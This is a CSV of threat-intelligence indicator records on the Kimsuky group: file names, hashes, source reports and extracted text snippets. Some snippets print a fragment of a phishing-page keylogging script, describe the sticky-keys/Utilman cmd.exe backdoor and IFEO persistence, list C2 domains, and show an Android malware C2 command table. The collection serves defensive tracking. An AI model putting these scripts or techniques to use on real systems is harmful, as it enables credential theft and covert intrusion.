1.0.0,actor--kimsuky,artifact--sha256:23e306aad853a6e97efd79775d20cac1925c6358904870adedaaa3398fc08859,observation--sha256:ced8f26eb7ec98ce2f1baa98aa29d89e42537b5fe2d04fa8b7dfb2ffc00e60bc,file-name,autoupdate.dll,autoupdate.dll,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:a1f61d078b7a2dba4d06858874fe463b45aa8492beea644398487c483a117dc2,observation--sha256:c3db325903b064ada9aba4a07d5522769d1d459050677257a7b495dced061774,file-name,bg.js,bg.js,candidate,,unknown,unknown,not-stated,2023-03-20T00:00:00Z,source--browser-advisory-2023,kimsuky/kimsuky-2023-03-20-joint-cyber-security-advisory.pdf,"{""page"": 9}","[""activity--browser-google-play""]","[""malware--fastviewer""]","[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,9 Indicators of Compromise Chromium-based web browser extension program Type IoCs Note C2 servers gonamod[.]com HTTPS siekis[.]com HTTPS mode=cd2&ver=3.0 HTTP param Malicious files 012D5FFE697E33D81B9E7447F4AA338B manifest.json 582A033DA897C967FAADE386AC30F604 bg.js 51527624E7921A8157F820EB0CA78E29 dev .js %APPDATA%\AF Download folder String AF Name of browser extension program Abuse Google Play’s synchronization feature Type IoCs Note C2 servers navernnail[.]com HTTP lowerp.onlinewebshop[.]net ,
1.0.0,actor--kimsuky,artifact--sha256:7a9cc50410031c347a859ae255d60b6b1d64d1a6a7dec78bd138c2acbf81ef96,observation--sha256:d83b054369d69d803556a155e10e250a1d56ed5638252847eb008865761236b2,file-name,blepulsar-1.3.1.exe,blepulsar-1.3.1.exe,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11:49:15 %SystemDrive%\users\%ASD%\downloads\eternal_bin\dou Note e\domain_x64.dll 11:49:15 Operation Covert Stalker Report emaudittouch-2.1.0.exe 20180222144514 Kimsuky's organization Note Eternal Blue epulsar-1.3.1.exe admin_x64_2003.exe Eternal Blue 20180510094312 diagnosis time blepulsar-1.3.1.exe hxxps://www.boannews.com/media/view.asp?idx=78933 Kimsuky's organization (Table 10) (Recent) Eternal Blue package and malware Eternal Blue hxxps://zdnet.co.kr/view/?no=20170516162743 age\domain_x64,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:31f7000a867fc72d9273dd3707018fbaec31445df6af865ce406f4997e2c58be,observation--sha256:a116d5e31f6d0a0874c2d8a8f70e687a2577764806589fba44ce62b3e7b01895,file-name,bootstrap.js,bootstrap.js,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 10}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 10 VIRUS BULLETIN CONFERENCE OCTOBER 2021 Stage 01: analytics.js?_=[BASE64(ID)]&token=[BASE64(Target)]=&delay=30&m=login After a warning window is displayed indicating that the session has been terminated and moving to the login page, it is disguised as if it has moved to the webmail login page (any page can be loaded through the iframe tag). The keylogging script works on the moved webmail disguised page, and the account",
1.0.0,actor--kimsuky,artifact--sha256:31f7000a867fc72d9273dd3707018fbaec31445df6af865ce406f4997e2c58be,observation--sha256:277be3c736a3545e359e90a65067b243044ea08aace428d45e67d9abc59b1018,file-name,bootstrap.js,bootstrap.js,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 11}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 11VIRUS BULLETIN CONFERENCE OCTOBER 2021 Stage 02: bootstrap.js?_=[BASE64(ID)]&token=[BASE64(Target)]=&m=login (Web page newly moved by iframe.) <script> </script><scripttype=""text/javascript""> $(function(){ functionsend(value=""""){ $.ajax({ url:""ga.js"", type:""post"", data:{ _:""[BASE64(ID)]"", token:btoa(value) } }); } $(""input"").keydown(function(evt) { send(""keydown:""+evt.target.value); }); $(""input"").change(function(evt) {",
1.0.0,actor--kimsuky,artifact--sha256:31f7000a867fc72d9273dd3707018fbaec31445df6af865ce406f4997e2c58be,observation--sha256:0a3921c81fb4b9913f8ee082d67ddaceedf6ac8f10007136afa33cd7e6060e79,file-name,bootstrap.js,bootstrap.js,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 9}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 9VIRUS BULLETIN CONFERENCE OCTOBER 2021 3.1 Phishing: spear-phishing link When browsing the email, it looks like it contains simple text (‘>> erroneous sending email’), but in fact it contains HTML code. One of the problems was that when the email was read on the webmail service, it was moved to the phishing page configured by the attacker.  Mailing Toolkit (phishing email sending URL): wallet-info.esy.es/mail_ok.php  S",
1.0.0,actor--kimsuky,artifact--sha256:db5b3803c89b2246ad2e8b2c1e89ca9103a741201cef4053022e7835514d46af,observation--sha256:67411c4c667899187105ab15efb5f11aa1cf6b5291d7d9cf05285827ea541cce,file-name,calc.exe,calc.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The types of virtual channels are as follows. Right picture of (Figure 9) ÿ rdpdr: File system extension. Access from server to client file system (Table 2) Condition comparison code of r_sethc_x64.exe To activate the sticky key function, press the Shift key five times in succession and the sticky key window will appear as shown below (Figure 10), which is handled by sethc.exe. However, if cmd.exe is copied to secthc.exe, cmd.exe can be executed by pressing the Shift key five times in a row, so ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8f58e62b2e3e20f05b8c713e63fbf0c4d631b8ca98ee09238870f26365c51d3e,observation--sha256:caacf88df33854467fcb496039044187a4fe96ddbeb33d466030668c18f66dea,file-name,can.pdb,can.pdb,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:2150ebbe98f0870d020f277bd8c5c36ccdb9c0772d2d16f831f7c5d7de06eee0,observation--sha256:5d12a7adfd746e77c34ae8ad52fd847535117a981253612a4be7861f1c0549eb,file-name,card.chm,card.chm,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:92362097e18b9429a55978a156af001252cf77713f29cbcc3e67e4cce96a6242,observation--sha256:fa737ee074406c06289494d93e23289b99aa4704baa054ba1c21b5d18ea536b2,file-name,cc.exe,cc.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:92362097e18b9429a55978a156af001252cf77713f29cbcc3e67e4cce96a6242,observation--sha256:9c40e919181613bef1f4979b80258b86943276921daf5478a61c0cf8c66da007,file-name,cc.exe,cc.exe,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5cbae19feb10df1c0cbef7e3f691198b667b1ecc4eadf990ec6ef13b51997a8d,observation--sha256:333b4a8d55d128016d0a37c1ce5380e472e84b746ea089a4fa16cebdad3a9b86,file-name,certutil.exe,certutil.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 30}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.2. VBS1유형 ○VBS 1 유형의CHM공격은2022년2월부터발견됐으며, 계약서, 개발가이드등의다양한내용으로유포됐습니다. [그림4-2] VBS1유형으로유포된CHM화면 ○VBS1유형은HTML파일내부에 BASE64 로인코딩된악성스크립트를포함하고있습니다. CHM 을실행할경우, 해당스크립트를DAT 로저장한다음certutil.exe를통해디코딩후, VBS파일로다시저장합니다. 이후, 지속성을유지하기위해레지스트리자동실행경로에VBS파일을추가합니다. [그림4-3] VBS1유형의HTML코드 Genians SecurityCenter 29",
1.0.0,actor--kimsuky,artifact--sha256:03ce4036f60f3c774025a72fbd2431708c9e0c98f154e3c9cf8d6a7378aeaa00,observation--sha256:314ecff2bcc815a49d162148be4ee40cc5bb701189add4a530251e6df36c6eb7,file-name,check.php,check.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 88}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"V3 diagnosis name Consent Form_Princeton Study.pdf Zoom meeting information Opinions on the unification of the Korean Peninsula and the situation in neighboring countries This is the blocking log. pbA== _MAL_BLOCK North Korea's Nuclear Threat: South Korea's Perceptions and US Deterrence of Nuclear Expansion This is a document containing information related to the state of affairs in the country. We must build a prosperous homeland.docx When executing a malicious batch file, it is part of the dec",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:83d20663714ed06d4bcdfe7aa3ac39a3c754f48b7c4c1d054719c498adb706df,observation--sha256:230827e678b812d251de784a757fde4c2f97a8d6572fff318d7d28fcdbd37556,file-name,chmMessage.chm,chmMessage.chm,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:e056c3ae8bfcd602f92bd8b13c53d88e48a7d22f673d68e909724f6b1c3d1f57,observation--sha256:ca16ee583a5a66bd0a4da45b7b0f20f5e28b624cd30ff83f4acf66e3a24914a1,file-name,chrome.exe,chrome.exe,candidate,2022-04-01T00:00:00Z,month,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 69}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"71 (Table 33) IP mapping record of navernnail.com ?fpath=/srv/disk18/4167496/www/koreaglobal.mypremsedge.exe anel\themes\mobile\images\about\temp/cook Operation Covert Stalker Report 28 The bait document (Summary of the Seo Hee roundtable meeting (draft).hwp) was valid. It was judged to be the Kimsuky organization's IP, not the analyst's IP. 2022.04 ~ 2022.05 18:51:15 59.7.91.171 se/quick/L_quick.php?fpath=/home/ssktool/public_ht 2022.06 ~ 2022.08 21*.16*.25*.5* obtained from the Yahoo folder ca",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ecc7632616f5fc66becfeea37eca9bb8c446491a1e104b19951bfcb5caf8fa60,observation--sha256:ee1c6a2747e05bf6ea46285127aee3f3133b32aee9dab8c9a744281cbe1af1ec,file-name,clear.bat,clear.bat,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt f2bf557f8e90522d67b773d56a898",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8d0a382022f746c81b1b27777b6210bcaaa945ae38ecf71f3e79e2ad1045231e,observation--sha256:fe196fa951e6d8a566aca7e6a92bb4ff84030e87419fe41a7c53564e5b7e1084,file-name,click.php,click.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 66}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report In the above (Figure 54), the file marked with a red box is the same file stored in the Temp folder of ""ÿ April 2022, namastte"" as a PHP mailer, and the file marked with a green box is a link in the body of the phishing email (ex. hxxp://C2/click.php), the file marked with a blue box is a waypoint included in the body of the phishing email. When you click on the waypoint, the user agent and IP information of the hacking target are displayed as ""mode_email ID of th",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:8d0a382022f746c81b1b27777b6210bcaaa945ae38ecf71f3e79e2ad1045231e,observation--sha256:cebe6d83d5316fc33d8e0ed6d94bc9ee837d7e6cb3271baa7ae3a9c96b398237,file-name,click.php,click.php,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c94896d862ef49fdd23e5338d3a326e83f28f0c37d1251a2778ec70a223aa612,observation--sha256:d3e9c79ef16dec3192efff95f3543d19676cac9705263f18eb49167572a5f93a,file-name,cmd.dat,cmd.dat,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[18]. 调用函数 c.c.a.c 之后在函数 c.c.a.e.c 中会拼接请求 URL 用于获取命令，拼接 URL 结果为 http://app.at -me.ml/index.php?m=b&p1=""android_id"" &p2=c，并创建 cmd.dat 文件用于存储命令，该 域名同样被解析到服务器 104.128.239.70。 图[19]. 拼接 URL 获取命令 最后调用函数 c.c.a.g.a ，用于执行服务端返回的命令（1，2，3，4，5，6，7，8）。",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:351da83b366a37ec7c2dfe870978fb7ac0dfe2dcabc821a8f654fcb8c1ae6291,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 18}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"The types of virtual channels are as follows. Right picture of (Figure 9) ÿ rdpdr: File system extension. Access from server to client file system (Table 2) Condition comparison code of r_sethc_x64.exe To activate the sticky key function, press the Shift key five times in succession and the sticky key window will appear as shown below (Figure 10), which is handled by sethc.exe. However, if cmd.exe is copied to secthc.exe, cmd.exe can be executed by pressing the Shift key five times in a row, so ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:e0dbb9ec1af6764938962335c4e418560dbe16792a631b0c1a71442b157e6339,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 19}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"For user convenience, when logging in, Windows 7 places the Accessibility ( ) button at the bottom left and clicks it to display accessibility settings as shown below (Figure 11), allowing users to set the environment to suit their preferences. The responsible file is Utilman.exe. Like sethc.exe, back up Utilman.exe to another file and then run cmd.exe. (Figure 11) Accessibility and using the magnifying glass feature 19 If you copy it as Utilman.exe, when you click the Accessibility button when ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:04c562e0bedbcdeaa213dc834e10469699776df8d19a346ee67fb7ab29e7dec4,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:f5cb4939d2135719f33b983fea3d5717aa313fbe508e85f6b01d9f891d85cd48,file-name,cmd.exe,cmd.exe,candidate,2023-07-14T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 26}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,Detect attempts to svchost.exe N/A (Table 6) Behavior log of Ammy RAT installation process 17:12:05 Operation Covert Stalker Report Target Process rundll32.exe Creates executable file ntrol\SafeBoot\Network\ts 2023-07-14 cmd.exe svchost.exe N/A It is Fileless. Connects to network 188.42.129.148:80(LU) aa_nts.dll Behavior 2) BlackBit ransomware infection svchost.exe process Report Time 17:12:03 Target aa_nts.dll (Ammy RAT) kmanager N/A 2023-07-14 N/A (Figure 15) File structure of BlackBit ransomw,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:5dcb378c79dba4fdb2a48c733fd4d7d40eeaa8eb6f15f711dacb12c9a474e259,file-name,cmd.exe,cmd.exe,candidate,2023-07-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 84}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"Executes 10:17:22 Connect to N/A 10:29:25 2023-07-17 2023-07-18 Operation Covert Stalker Report File Less explorer.exe network 10:29:25 explorer.exe Process Executes 5911.pdf.exe N/A 2023-07-18 mshta.exe 2023-07-14 2023-07-14 process process network Creates This is an excerpt of some of the malicious actions performed by the Kimsuky organization on 14*.10*.23*.21*(US), which occurs through malware testing. mshta.exe 10:29:25 10:17:22 2023-07-18 [+] (ASEC Blog) “Distributing malware disguised as ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:8b498a412ebd367711bebe7bb59fd6bdb376d7126521177784c8eb100854b8ad,file-name,cmd.exe,cmd.exe,candidate,2023-07-14T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 85}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"Connect to 17:24:22 211.249.220.24:443 (Table 48) Malware behavior log of 14*.10*.23*.21*(US) mshta.exe Operation Covert Stalker Report process 85 17:24:22 N/A N/A Submit v.doc.exe 2023-07-14 N/A It is designed to download and execute malicious code, but at the time of analysis, it is converted into a decoy file and malicious code as shown below (Figure 66). Deletes executable mshta.exe Myeon Golf Chairman.exe The malicious code in the above (Table 48), the malicious code disclosed on the ASEC b",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:9b3eea32b2e614c183405f53f208c32314d48a97a40bddc27ef4cda330a4516a,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 13}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"In addition, the file name 'upload.php' is used in common for information leakage. The C2 server exploiting the HWP vulnerability is in Korea, and the C2 server exploiting DOC vulnerability contains the subaddress 'kr' in the middle of the address. Also, both files have exactly the same registry key 'VBAWarnings' and the log file name 'ttmp.log'. Many of the traces mentioned above and the similar pattern of server-side attacks are suggesting that both HWP malicious documents found in Korea and t",
1.0.0,actor--kimsuky,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:ad6ec418696f1c1d8c6b64be013aa429ee6e690ea96057549ef2008b24e98ed3,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 9}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"9 Rapid7 also observed a recent version with an embedded payload that uses PowerShell to extract to %temp% before execution. Similarly, a previous version of Kimsuky LNK payloads uses the same embedded payload method of extraction with heavily obfuscated PowerShell substitution. Figure 7 - Heavily obfuscated embedded payload variant Rapid7 observed several techniques to bypass lazy signatures or tooling limitations: • Move towards in-memory execution to limit dropping malware binaries on disk • ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ae8ec27765621288616b3d4bf14fb5ddebf085927c2107b49b4d1637c480b7b5,observation--sha256:f479e7a624a33c6e8710de6ec53466dc075b5bd368b8320123029b9af6629e9d,file-name,cmd_xxxxx.dat,cmd_xxxxx.dat,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[20]. 响应 C2 服务器远程指令 命令 动作 1 会提醒用户更新并进行更新操作 2 创建了 list.xls 和 zip.dat ，并遍历/sdcard 目录及其子文件夹下的 所有文件，把文件信息写入了 list.xls 3 上传指定的文件 4 使用 “sh -c”对 cmd_xxxxx.dat 的内容进行执行，把执行结果 写入 cmd_xxxxx.txt ,经过相同的伪装，调用 c.d() 上传 5 创建 sms.txt ，调用安卓短信协议，获取信息写入 sms.txt 6 清除 app 的数据 7 清除 app 的缓存 8 发送短信 3.5 攻击韩国原子能研究所 韩国新闻媒体《朝鲜日报》近日报道韩国原子能研究院于 5 月 14 日遭到朝鲜 APT 组 织 Kimsuky 